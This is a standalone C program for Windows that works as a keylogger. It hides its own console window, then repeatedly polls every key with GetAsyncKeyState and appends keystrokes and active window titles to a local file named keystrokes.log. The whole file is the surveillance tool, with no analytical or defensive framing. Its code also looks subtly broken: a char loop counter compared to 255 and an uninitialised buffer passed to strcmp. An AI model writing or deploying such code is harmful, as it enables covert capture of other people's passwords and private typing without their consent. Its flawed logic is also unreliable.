#include <stdio.h>
#include <windows.h>
#include <winuser.h>

int main() {
    FILE *file;
    HWND window;
    char current_window[256], new_window[256] = "";
    char key;

    // Hide the console window
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    // Open the log file
    file = fopen("keystrokes.log", "a+");

    while (1) {
        Sleep(10);

        // Get the window in focus
        window = GetForegroundWindow();
        if (window) {
            GetWindowTextA(window, new_window, sizeof(new_window));
            if (strcmp(current_window, new_window) != 0) {
                fputs("\n[WINDOW CHANGE]: ", file);
                fputs(new_window, file);
                strcpy(current_window, new_window);
            }
        }

        // Check every key for a keystroke
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if (key == VK_RETURN) {
                    fputc('\n', file);
                } 
                else if (key == VK_BACK) {
                    fputs("[BACKSPACE]", file);
                } 
                else if (key == VK_SPACE) {
                    fputc(' ', file);
                } 
                else if (key == VK_TAB) {
                    fputs("[TAB]", file);
                } 
                else if (key == VK_SHIFT) {
                    fputs("[SHIFT]", file);
                } 
                else {
                    fputc(key, file);
                }
            }
        }
        fflush(file);
    }

    fclose(file);
    return 0;
}
